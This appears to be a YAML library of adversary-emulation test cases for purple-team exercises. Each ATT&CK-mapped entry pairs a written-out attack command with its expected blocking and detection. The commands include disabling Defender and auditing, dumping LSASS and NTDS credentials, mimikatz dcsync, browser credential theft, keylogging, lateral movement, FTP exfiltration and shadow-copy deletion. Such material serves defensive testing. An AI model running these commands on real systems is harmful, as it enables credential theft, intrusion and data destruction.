+  guidance:
+  - beacon> dllinject {{ pid }}
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool
+  logs:
+  - edr:telemetry
+  - process_create
+  controls:
+  - Endpoint Protection
+- name: DLL Loader
+  description: Launch a exe payload that will load a DLL from its resource section
+    into memory
+  metadata:
+    isv: 1
+    tactic: TA0005
+    tid: T1055.001
+    x_vectr_id: f6bca16b-5ea8-454e-86a3-62fbff291c72
+    x_tool_links:
+    - https://gist.github.com/2XXE-SRA/156df55ec2cfdc22a33e2b66de30c309
+    groups:
+    - APT29
+    - Wizard Spider
+  platforms:
+  - windows
+  guidance:
+  - CMD> {{ exe_payload }}
+  block:
+  - Suspicious behavior is blocked by EDR or other endpoint security tool or payload
+    is deleted from disk based on static characteristics
+  detect:
+  - Suspicious behavior is detected by EDR or other endpoint security tool or payload
+    is detetced on disk based on static characteristics
+  logs:
+  - edr:telemetry
+  controls:
+  - Endpoint Protection
+- name: Disable Windows auditing with auditpol.exe
+  description: Disable Windows advanced auditing features on the endpoint using the
+    native utility "auditpol.exe"
+  metadata:
+    isv: 1
+    tactic: TA0005
+    tid: T1562.002
+    x_vectr_id: 3eddd649-66ef-45c0-84fe-9e27d9ba29b4
+    groups:
+    - APT29
+  platforms:
+  - windows
+  prerequisites:
+  - local_admin
+  guidance:
+  - cmd> auditpol /set /category:"Detailed Tracking" /success:disable /failure:disable
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Changes to audit policy configurations are detected in the SIEM via 4719 event
+    ids
+  logs:
+  - edr:telemetry
+  - process_create
+  - winevent
+  controls:
+  - Endpoint Protection
+  - SIEM
+- name: Block Outbound UDP with netsh
+  description: Block outbound traffic to UDP ports 53 (DNS) and 137 (NetBIOS) on the
+    Windows firewall using netsh.exe.
+  metadata:
+    isv: 1
+    tactic: TA0005
+    tid: T1562.004
+    x_vectr_id: 64dc404a-4dbc-4762-bf18-277406dab83c
+    groups:
+    - APT29
+  platforms:
+  - windows
+  prerequisites:
+  - local_admin
+  guidance:
+  - cmd> netsh advfirewall firewall add rule name="{{ rule_name }}" protocol=UDP dir=out
+    localport=137 action=block
+  - cmd> netsh advfirewall firewall add rule name="{{ rule_name }}" protocol=UDP dir=out
+    localport=53 action=block
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Anomalous firewall changes are detected in the SIEM using endpoint security tool
+    telemetry and/or Windows event ID 4948/4947/4946
+  logs:
+  - winevent
+  - edr:telemetry
+  - process_create
+  controls:
+  - Endpoint Protection
+  - SIEM
+- name: Disable security tool service remotely
+  description: Remotely disable a service associated with a security tool running
+    on a target system by using "sc.exe"
+  metadata:
+    isv: 1
+    tactic: TA0005
+    tid: T1562.001
+    x_vectr_id: afd90b90-a0d3-44f4-baf9-721327359d7f
+    groups:
+    - APT29
+    - Wizard Spider
+  prerequisites:
+  - logon_rights
+  - local_admin
+  guidance:
+  - cmd> sc \\{{ target }} stop {{ service }}
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  - Remote access to the service control manager is blocked by DACLs
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Alert on the service stop event for services related to critical functions like
+    security tools using native Windows logs and/or endpoint security tool telemetry
+  logs:
+  - winevent
+  - edr:telemetry
+  - process_create
+  controls:
+  - Endpoint Protection
+  - SIEM
+  - Hardening
+- name: Disable Defender using PowerShell
+  description: Disable Windows Defender AV using Defender PowerShell cmdlets
+  metadata:
+    isv: 1
+    tactic: TA0005
+    tid: T1562.001
+    x_vectr_id: 0517c1b7-b9be-41bd-a040-255a27628a01
+    groups:
+    - APT29
+    - Wizard Spider
+  prerequisites:
+  - local_admin
+  guidance:
+  - ps> Set-MpPreference -DisableBehaviorMonitoring $true
+  - ps> Set-MpPreference -DisableRealtimeMonitoring $true
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  detect:
+  - Alert on the service stop event for services related to critical functions (e.g.
+    native Windows log service and/or endpoint security tool telemetry) or when those
+    services fail to deliver logs
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  logs:
+  - winevent
+  - edr:telemetry
+  controls:
+  - Endpoint Protection
+  - SIEM
+- name: Certutil decode Base64 encoded payload
+  description: Use certutil.exe to decode an encoded payload file
+  metadata:
+    isv: 1
+    tactic: TA0005
+    tid: T1140
+    x_vectr_id: 9dbfedcf-893f-4086-b428-2f3bc73c96a5
+    groups:
+    - Kimsuky
+  platforms:
+  - windows
+  guidance:
+  - cmd> certutil -decode {{ infile_name }} {{ outfile_name }}
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  logs:
+  - edr:telemetry
+  - process_create
+  controls:
+  - Endpoint Protection
+  - SIEM
+Discovery:
+- name: Retrieve system information
+  description: Retrieve information about the system using "systeminfo"
+  metadata:
+    isv: 1
+    tactic: TA0007
+    tid: T1082
+    x_vectr_id: 5c37bc54-8fe0-41c9-ae82-99ae57b9146e
+    groups:
+    - APT29
+    - Lazarus
+  platforms:
+  - windows
+  guidance:
+  - CMD> systeminfo
+  block:
+  - null
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  logs:
+  - edr:telemetry
+  - process_create
+  controls:
+  - Endpoint Protection
+  - SIEM
+- name: Retrieve system network information
+  description: Retrieve information about the system's networking using "ipconfig"
+  metadata:
+    isv: 1
+    tactic: TA0007
+    tid: T1016
+    x_vectr_id: 67d05a60-d0aa-4b9c-87cc-d85a5a19922c
+    groups:
+    - APT41
+  platforms:
+  - windows
+  guidance:
+  - CMD> ipconfig /all
+  block:
+  - null
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  logs:
+  - edr:telemetry
+  - process_create
+  controls:
+  - Endpoint Protection
+  - SIEM
+- name: Enumerate domain information using renamed adfind.exe
+  description: Using the tool "adfind.exe" (renamed to "csrss.exe"), enumerate domain
+    information like domain users, groups, etc.
+  metadata:
+    isv: 1
+    tactic: TA0007
+    tid: T1087.002
+    x_vectr_id: dcfeaeaf-4486-4573-a936-2536b935a220
+    groups:
+    - Wizard Spider
+    - APT29
+    - APT41
+  platforms:
+  - windows
+  guidance:
+  - cmd> csrss.exe -h {{ domain }} -f (name="Domain Admins") member -list | csrss.exe
+    -h {{ domain }} -f objectcategory=* > .\output.log
+  - cmd> csrss.exe -h {{ domain }} -sc u:* > .\output.log
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - A source generating a large number of object access events (e.g. event id 4662)
+    is detected by the SIEM after configuring auditing on domain objects
+  logs:
+  - winevent
+  - edr:telemetry
+  controls:
+  - Endpoint Protection
+  - UEBA
+  - SIEM
+- name: Domain group member discovery via net.exe
+  description: Identify members of the Domain Admins and Enterprise Admins domain
+    groups
+  metadata:
+    isv: 1
+    tactic: TA0007
+    tid: T1087.002
+    x_vectr_id: a8537560-fd62-4a93-9fc5-207945961a03
+    groups:
+    - Wizard Spider
+    - APT29
+    - APT41
+  platforms:
+  - windows
+  guidance:
+  - cmd> net group "Domain Admins" /domain
+  - cmd> net group "Enterprise Admins" /domain
+  - cmd> net user administrator /domain
+  block:
+  - null
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - A source generating a large number of object access events (e.g. event id 4656)
+    is detected by the SIEM after configuring auditing on domain objects
+  logs:
+  - process_create
+  controls:
+  - SIEM
+  - Endpoint Protection
+- name: BloodHound session enumeration
+  description: Use Bloodhound/Sharphound to preform queries across the domain for
+    session information
+  metadata:
+    isv: 1
+    tactic: TA0007
+    tid: T1087.002
+    x_vectr_id: 29e04946-9b9c-4cef-bc59-e264846ccb2a
+    groups:
+    - Wizard Spider
+    - APT29
+    - APT41
+  guidance:
+  - beacon> execute-assembly SharpHound.exe -c Session --randomfilenames --zippassword
+    {{ password }} --memcache
+  - beacon> execute-assembly SharpHound3.exe -c Session --RandomizeFilenames --EncryptZip
+    --NoSaveCache
+  block:
+  - Prevent unprivileged users from enumerating session information by updating the
+    appropriate configuration with a tool like NetCease
+  detect:
+  - Windows enumeration activities detected from large amount of network traffic (SMB,
+    ARP requests) from UEBA or network monitoring tools
+  logs:
+  - winevent
+  - edr:telemetry
+  controls:
+  - SIEM
+  - UEBA
+- name: Domain trust discovery via nltest.exe
+  description: Identify all domain trust relationships using nltest.exe
+  metadata:
+    isv: 1
+    tactic: TA0007
+    tid: T1482
+    x_vectr_id: 4266c26e-0470-4b97-8dc3-1d24fe35f586
+    groups:
+    - Wizard Spider
+  platforms:
+  - windows
+  guidance:
+  - cmd> nltest.exe /domain_trusts /all_trusts
+  block:
+  - null
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  logs:
+  - edr:telemetry
+  - process_create
+  controls:
+  - Endpoint Protection
+  - SIEM
+- name: Domain Controller discovery via nltest
+  description: Use nltest.exe commands to identify domain controllers in the domain
+  metadata:
+    isv: 1
+    tactic: TA0007
+    tid: T1018
+    x_vectr_id: bc85f11b-e481-4afb-a5f5-db26e5c07433
+    groups:
+    - Wizard Spider
+    - APT41
+  platforms:
+  - windows
+  guidance:
+  - cmd> nltest.exe /dclist:{{ domain }}
+  block:
+  - null
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  logs:
+  - edr:telemetry
+  - process_create
+  controls:
+  - Endpoint Protection
+  - SIEM
+- name: Share discovery via net.exe
+  description: Use net.exe to list out shares for the system
+  metadata:
+    isv: 1
+    tactic: TA0007
+    tid: T1135
+    x_vectr_id: 763f909f-d298-48c6-a2ee-3975d0a0180c
+    groups:
+    - Wizard Spider
+  platforms:
+  - windows
+  guidance:
+  - cmd> net.exe view /all
+  block:
+  - null
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  logs:
+  - edr:telemetry
+  - process_create
+  controls:
+  - Endpoint Protection
+  - SIEM
+- name: Security tool discovery via wmic.exe
+  description: Enumerated installed security tools on the local system using WMIC
+  metadata:
+    isv: 1
+    tactic: TA0007
+    tid: T1518.001
+    x_vectr_id: 4c153595-eb20-4e2b-90ed-d11e65e1373c
+    groups:
+    - Wizard Spider
+  platforms:
+  - windows
+  guidance:
+  - cmd> WMIC.exe /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct
+    Get displayName /Format:List
+  block:
+  - null
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  logs:
+  - edr:telemetry
+  - process_create
+  controls:
+  - Endpoint Protection
+  - SIEM
+Collection:
+- name: Keylogger
+  description: Log user keystrokes using beacon
+  metadata:
+    isv: 1
+    tactic: TA0009
+    tid: T1056.001
+    x_vectr_id: be524cb1-12e6-4708-ad57-faf91dfad9de
+    groups:
+    - Kimsuky
+    - Lazarus
+  platforms:
+  - windows
+  guidance:
+  - beacon> keylogger [{{ pid }}] [{{ arch }}]
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool
+  logs:
+  - edr:telemetry
+  controls:
+  - Endpoint Protection
+Credential Access:
+- name: Extract Browser Credentials
+  description: Extract credentials information (saved passwords, sessions) from browser
+  metadata:
+    isv: 1
+    tactic: TA0006
+    tid: T1555.003
+    x_vectr_id: 43a943fb-d75a-4fa6-9f5b-8824f8134936
+    groups:
+    - Kimsuky
+    - Trickbot
+    - Zirconium
+  platforms:
+  - windows
+  guidance:
+  - beacon> execute-assembly SharpChrome.exe logins
+  - beacon> execute-assembly SharpChrome.exe cookies
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool
+  - Suspicious access to database files used by browsers detected using audit logs
+    and/or endpoint security tool telemetry in the SIEM
+  logs:
+  - edr:telemetry
+  - winevent
+  controls:
+  - Endpoint Protection
+  - SIEM
+- name: Extract Credential Manager credentials
+  description: Extract credentials information from Windows Credential Manager
+  metadata:
+    isv: 1
+    tactic: TA0006
+    tid: T1555.004
+    x_vectr_id: aba64d4d-1f59-4295-bb43-51766e791962
+    groups:
+    - Kimsuky
+  platforms:
+  - windows
+  guidance:
+  - mimikatz> sekurlsa::credman
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool
+  logs:
+  - edr:telemetry
+  controls:
+  - Endpoint Protection
+- name: Extract local user credentials using hashdump
+  description: Use hashdump to extract local user credentials from the SAM
+  metadata:
+    isv: 1
+    tactic: TA0006
+    tid: T1003.002
+    x_vectr_id: b2cced6c-b8b1-4ee8-93d9-4f5dc4b61afb
+    groups:
+    - APT41
+  platforms:
+  - windows
+  prerequisites:
+  - local_admin
+  guidance:
+  - beacon> hashdump
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool
+  - Suspicious Windows registry access detected in the SIEM using Windows registry
+    telemetry
+  logs:
+  - edr:telemetry
+  - winevent
+  controls:
+  - Endpoint Protection
+  - SIEM
+- name: Extract credentials from LSASS via Beacon logonpasswords
+  description: Use beacon's logonpasswords to extract credentials from LSASS process
+    memory
+  metadata:
+    isv: 1
+    tactic: TA0006
+    tid: T1003.001
+    x_vectr_id: 9d2c89c9-89a0-4648-9280-7daf9447b9bf
+    groups:
+    - APT28
+    - APT41
+  platforms:
+  - windows
+  prerequisites:
+  - local_admin
+  guidance:
+  - beacon> logonpasswords
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  - Enable additional LSA protections or Windows Credential Guard to prevent traditional
+    process dumping of LSASS
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool
+  logs:
+  - edr:telemetry
+  controls:
+  - Endpoint Protection
+- name: Dump LSASS memory using builtin comsvcs.dll
+  description: Use rundll32 and comsvcs.dll to dump LSASS process memory to disk
+  metadata:
+    isv: 1
+    tactic: TA0006
+    tid: T1003.001
+    x_vectr_id: 314b4f6a-b27a-4a55-af5c-c98bc3146dd8
+    groups:
+    - APT28
+    - APT41
+  platforms:
+  - windows
+  prerequisites:
+  - local_admin
+  guidance:
+  - CMD> rundll32.exe c:\windows\system32\comsvcs.dll MiniDump {{ lsass_pid }}
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  - Enable additional LSA protections or Windows Credential Guard to prevent traditional
+    process dumping of LSASS
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool
+  logs:
+  - edr:telemetry
+  - process_create
+  controls:
+  - Endpoint Protection
+- name: Extract domain user credentials via replication
+  description: Replicate a user's hash from a domain controller using replication
+    APIs.
+  metadata:
+    isv: 1
+    tactic: TA0006
+    tid: T1003.006
+    x_vectr_id: d6dd145b-c7ae-4f79-bc07-179a012a7a07
+    groups:
+    - APT29
+  platforms:
+  - windows
+  prerequisites:
+  - domain_admin
+  guidance:
+  - 'mimikatz> lsadump::dcsync /domain:{{ domain }} /user:{{ user }}
+
+    OR
+
+    beacon> dcsync {{ domain fqdn }} {{ domain }}\{{ user }}'
+  block:
+  - null
+  detect:
+  - SIEM rules are configured to detect domain replication events from systems that
+    are not domain controllers
+  logs:
+  - winevent
+  controls:
+  - SIEM
+  - UEBA
+- name: Kerberoasting
+  description: Retrieve Kerberos tickets (TGS) from Active Directory for users with
+    service principal names (SPNs) set
+  metadata:
+    isv: 1
+    tactic: TA0006
+    tid: T1558.003
+    x_vectr_id: 0a310389-35f6-4ffa-9a53-6e1c169f0021
+    groups:
+    - APT29
+    - Wizard Spider
+  guidance:
+  - beacon> execute-assembly rubeus.exe kerberoast
+  block:
+  - null
+  detect:
+  - Detect a high volume of TGS requests or unique service principals from a single
+    source in a small period of time.
+  - Detect the use of RC4 encryption for Kerberos on AES enabled hosts
+  - Configure a honey account with an SPN and generate an alert when the TGS for that
+    account is requested
+  logs:
+  - winevent
+  controls:
+  - SIEM
+  - UEBA
+- name: Extract domain user credentials via ntdsutil
+  description: Dump domain hashes for all domain users on the domain controller via
+    ntdsutil, which uses Volume Shadow Services (VSS)
+  metadata:
+    isv: 1
+    tactic: TA0006
+    tid: T1003.003
+    x_vectr_id: f8712bc6-dde5-41ba-bb98-e7940ef7f061
+    groups:
+    - APT28
+  platforms:
+  - windows
+  prerequisites:
+  - local_admin
+  guidance:
+  - CMD> ntdsutil "ac in ntds" "ifm" "cr fu {{ outdirectory }}" q q
+  block:
+  - Endpoint security tool rules are configured to detect malicious use of Volume
+    Shadow Copy and related system utilities/commands
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Endpoint security tool and/or SIEM rules are configured to detect malicious use
+    of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit
+  - SIEM rules are configured to alert on anomalous logons to DCs from domain admin
+    users and service accounts
+  logs:
+  - process_create
+  - winevent
+  - edr:telemetry
+  controls:
+  - SIEM
+  - Endpoint Protection
+Lateral Movement:
+- name: Lateral Movement via WMI
+  description: Move to another system by using Windows Management Instrumentation
+    (WMI) to spawn a process on that target system
+  metadata:
+    isv: 1
+    tactic: TA0008
+    tid: T1021.003
+    x_vectr_id: 3c337f53-d086-4f2f-818a-08fb1a1c5f79
+    groups:
+    - Wizard Spider
+    - APT29
+    - APT41
+  platforms:
+  - windows
+  prerequisites:
+  - logon_rights
+  guidance:
+  - CMD> wmic /node:"{{ target }}" process call create "{{ command }}"
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  - Host-based firewalls prevent direct communications over common ports/protocols
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Anomalous remote access patterns detected in the SIEM using authentication logs
+    or by a UEBA-like tool
+  logs:
+  - edr:telemetry
+  - winevent
+  - process_create
+  controls:
+  - Endpoint Protection
+  - SIEM
+  - UEBA
+  - Hardening
+- name: Lateral Movement via Scheduled Task
+  description: Move laterally to another systen by creating a scheduled task on that
+    system
+  metadata:
+    isv: 1
+    tactic: TA0008
+    tid: T1021.003
+    x_vectr_id: 6b5ace78-2c04-4dda-82fa-a2784cc165e5
+    groups:
+    - Wizard Spider
+    - APT29
+    - APT41
+  platforms:
+  - windows
+  prerequisites:
+  - logon_rights
+  guidance:
+  - cmd> schtasks /create /F /tn "\Microsoft\Windows\SoftwareProtectionPlatform\EventCacheManager"
+    /tr "C:\Windows\SoftwareDistribution\EventCacheManager.exe" /sc ONSTART /ru system
+    /S {{ target }}
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  - Host-based firewalls prevent direct communications over common ports/protocols
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Anomalous remote access patterns detected in the SIEM using authentication logs
+    or by a UEBA-like tool
+  - Suspicious Windows task registration detected in the SIEM using Windows system
+    events
+  logs:
+  - edr:telemetry
+  - winevent
+  - process_create
+  controls:
+  - Endpoint Protection
+  - SIEM
+  - UEBA
+  - Hardening
+- name: Lateral Movement via WMI and rundll32
+  description: Move to another system by using Windows Management Instrumentation
+    (WMI) to launch a DLL via rundll32 on that target system
+  metadata:
+    isv: 1
+    tactic: TA0008
+    tid: T1021.003
+    x_vectr_id: f53ec692-764c-4229-a820-a073c78a3b4d
+    groups:
+    - Wizard Spider
+    - APT29
+    - APT41
+  platforms:
+  - windows
+  prerequisites:
+  - logon_rights
+  guidance:
+  - cmd> wmic /node:"{{ target }}" process call create "rundll32 {{ dll_payload }}
+    {{ dll_export }}"
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  - Host-based firewalls prevent direct communications over common ports/protocols
+  - Payload on disk deleted/quarantined by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Anomalous remote access patterns detected in the SIEM using authentication logs
+    or by a UEBA-like tool
+  - Payload on disk triggers a endpoint security tool alert
+  logs:
+  - edr:telemetry
+  - winevent
+  - process_create
+  controls:
+  - Endpoint Protection
+  - SIEM
+  - UEBA
+  - Hardening
+- name: Lateral Movement via WinRM
+  description: Move laterally to another system by using WinRM to execute a DLL payload
+    using rundll32.
+  metadata:
+    isv: 1
+    tactic: TA0008
+    tid: T1021.006
+    x_vectr_id: 9b9499c1-8a67-47a7-9f8b-8485bdb69aaa
+    groups:
+    - APT29
+    - Wizard Spider
+  platforms:
+  - windows
+  prerequisites:
+  - logon_rights
+  guidance:
+  - PS> Invoke-Command -ComputerName {{ target }} -ScriptBlock { rundll32 {{ dll_payload
+    }} {{ dll_export }} }
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  - Host-based firewalls prevent direct communications over common ports/protocols
+  - Payload on disk deleted/quarantined by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Anomalous remote access patterns detected in the SIEM using authentication logs
+    or by a UEBA-like tool
+  - Payload on disk triggers a endpoint security tool alert
+  logs:
+  - edr:telemetry
+  - winevent
+  - process_create
+  controls:
+  - Endpoint Protection
+  - SIEM
+  - UEBA
+  - Hardening
+- name: Internal C2 Channel over SMB
+  description: Establish and communicate over a peer-to-peer SMB C2 channel on the
+    internal network
+  metadata:
+    isv: 1
+    tactic: TA0011
+    tid: T1071
+    x_vectr_id: 20763d53-5309-41d0-a988-329b3712da61
+    groups:
+    - APT29
+  prerequisites:
+  - logon_rights
+  guidance:
+  - beacon> link {{ target }}
+  block:
+  - Host-based firewalls prevent direct communications over common ports/protocols
+  detect:
+  - Anomalous remote access patterns detected in the SIEM using authentication logs
+    or by a UEBA-like tool
+  logs:
+  - edr:telemetry
+  - winevent
+  controls:
+  - Endpoint Protection
+  - SIEM
+  - UEBA
+  - Hardening
+- name: Lateral Movement via RDP
+  description: Perform an interactive logons to a Windows system via RDP
+  metadata:
+    isv: 1
+    tactic: TA0008
+    tid: T1021.001
+    x_vectr_id: 0735ef7e-438f-4fc9-a656-7d11d73fbc61
+    groups:
+    - Wizard Spider
+  platforms:
+  - windows
+  prerequisites:
+  - logon_rights
+  guidance:
+  - CMD> mstsc /v:{{ dc }}
+  block:
+  - Host-based firewalls prevent direct communications over common ports/protocols
+  detect:
+  - Anomalous remote access patterns detected in the SIEM using authentication logs
+    or by a UEBA-like tool
+  logs:
+  - edr:telemetry
+  - winevent
+  controls:
+  - SIEM
+  - UEBA
+  - Hardening
+- name: Lateral Movement via service creation
+  description: Move to another system by copying an exe to the ADMIN$ share then creating
+    and starting a service using it
+  metadata:
+    isv: 1
+    tactic: TA0008
+    tid: T1021.002
+    x_vectr_id: 910af4aa-8cd2-42d3-affe-ad917e21b5c7
+    groups:
+    - Wizard Spider
+    - Trickbot
+  platforms:
+  - windows
+  prerequisites:
+  - logon_rights
+  guidance:
+  - cmd> copy {{ exe }} \\{{ target }}\ADMIN$
+  - cmd> sc \\{{ target }} create {{ service }} binPath=c:\windows\{{ exe }}
+  - cmd> sc \\{{ target }} start {{ service }}
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  - Host-based firewalls prevent direct communications over common ports/protocols
+  - Remote access to the service control manager is blocked by a DACL, preventing
+    service creation by remote users
+  - Payload on disk deleted/quarantined by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Anomalous remote access patterns detected in the SIEM using authentication logs
+    or by a UEBA-like tool
+  - Payload on disk triggers a endpoint security tool alert
+  logs:
+  - edr:telemetry
+  - winevent
+  - process_create
+  controls:
+  - Endpoint Protection
+  - SIEM
+  - UEBA
+  - Hardening
+Exfiltration:
+- name: Data compression via 7zip
+  description: Compress file(s) using the 7zip utility
+  metadata:
+    isv: 1
+    tactic: TA0009
+    tid: T1560.001
+    x_vectr_id: 88db754a-c152-4737-98dd-03079224a00b
+    groups:
+    - APT28
+    - APT29
+  platforms:
+  - windows
+  guidance:
+  - cmd> 7za.exe a {{ zip_file }} {{ input_files }}
+  block:
+  - Block the installation and usage of unapproved third-party utilities via application
+    control software
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  logs:
+  - process_create
+  controls:
+  - Application Control
+  - Endpoint Protection
+  - SIEM
+- name: Exfiltration over FTP
+  description: Exfiltrate data from the internal network to an external system via
+    FTP
+  metadata:
+    isv: 1
+    tactic: TA0010
+    tid: T1048.003
+    x_vectr_id: 34aabb0b-62b9-416e-b2fb-2633208c90fc
+    groups:
+    - Wizard Spider
+  guidance:
+  - "ftp> \nUSER {{ user }}\nPASS {{ password }}\nOPTS utf8 on\nPWD\nTYPE I\nPASV\n\
+    STORE {{ local_file }} {{ dest_name }}\nPASV\nSTORE {{ local_file }} {{ dest_name\
+    \ }}\n"
+  block:
+  - Connections to known malicious domains/IPs are blocked
+  - If there is no business justification, block outbound FTP communications
+  detect:
+  - Network-based DLP detects sensitive data egressing the network
+  - Connections with suspicious characteristics (e.g. first seen in environment, low
+    domain age, weak/unknown reputation, bad/unknown categorization) generate alerts
+    in the SIEM or network security controls
+  logs:
+  - network
+  controls:
+  - DLP
+  - Firewall
+  - SIEM
+Impact:
+- name: Delete Volume Shadow Copies
+  description: Delete volume shadow copies on the host to inhibit file system recovery
+  metadata:
+    isv: 1
+    tactic: TA0040
+    tid: T1490
+    x_vectr_id: 31d4a02d-4a66-4740-a9c4-8814319fd5c4
+    groups:
+    - Wizard Spider
+  platforms:
+  - windows
+  prerequisites:
+  - local_admin
+  guidance:
+  - CMD> vssadmin.exe delete shadows /all /quiet
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  - Endpoint security tool rules are configured to detect malicious use of Volume
+    Shadow Copy and related system utilities/commands
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Endpoint security tool and/or SIEM rules are configured to detect malicious use
+    of Volume Shadow Copy and related system utilities/commands
+  logs:
+  - edr:telemetry
+  - process_create
+  controls:
+  - Endpoint Protection
+  - SIEM
+- name: Encrypt a large amount of files
+  description: Encrypt a large amount of files on disk to simulate ransomware behavior
+  metadata:
+    isv: 1
+    tactic: TA0040
+    tid: T1486
+    x_vectr_id: 5ec16a0b-b799-4784-b151-5dadb297d4f7
+    groups:
+    - Wizard Spider
+  guidance:
+  - CMD> {{ ransomware_binary }}
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  - Payload on disk deleted/quarantined by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Payload on disk triggers a endpoint security tool alert
+  - A large amount of file deletion and/or file creations with known ransomware extensions
+    are detected by the SIEM using file system telemetry or by a FIM-like tool
+  logs:
+  - edr:telemetry
+  - process_create
+  controls:
+  - Endpoint Protection
+  - SIEM
+  - FIM
+- name: Modify Local Drive Permissions
+  description: Modify the permissions of a local drive to allow the ransomware process
+    to modify files on that drive
+  metadata:
+    isv: 1
+    tactic: TA0005
+    tid: T1222.001
+    x_vectr_id: e39cf923-5618-4de1-863d-4c33f27b27cc
+    groups:
+    - Wizard Spider
+  platforms:
+  - windows
+  prerequisites:
+  - local_admin
+  guidance:
+  - cmd> icacls "{{ drive_letter }}:\*" /grant Everyone:F /T /C /Q
+  block:
+  - Suspicious process execution/behavior blocked by endpoint security tool
+  detect:
+  - Suspicious process execution/behavior is detected by endpoint security tool or
+    triggers alert in SIEM based on telemetry
+  - Use Windows advanced auditing capabilities to monitor for bulk changes to DACLs
+    (event id 4670) and alert on suspicious events in the SIEM
+  logs:
+  - edr:telemetry
+  - process_create
+  - winevent
+  controls:
+  - Endpoint Protection
+  - SIEM
+- name: Stop multiple services using net and taskkill
+  description: Stop multiple services/service processes on the endpoint using net
+    and taskkill
+  metadata:
+    isv: 1
+    tactic: TA0040
+    tid: T1489
+    x_vectr_id: 90d23926-3a5b-46b3-abb9-4eceb69479d4
+    x_tool_links:
+    - https://gist.github.com/2XXE-SRA/6abe96bde27b1891c1297253823e20e7
+    groups:
+    - Wizard Spider
+  platforms:
+  - windows
+  prerequisites:
+  - local_admin
+  guidance:
+  - cmd> {{ bat_file }}
+  block:
+  - Critical security services are configured by vendor to run as protected processes,
+    preventing administrative users from disabling them via traditional methods
+  detect:
+  - Use Windows process and service audit capabilities or endpoint security tool telemetry
+    to detect a user stopping multiple processes/services
+  logs:
+  - edr:telemetry
+  - winevent
+  controls:
+  - Endpoint Protection
+  - SIEM
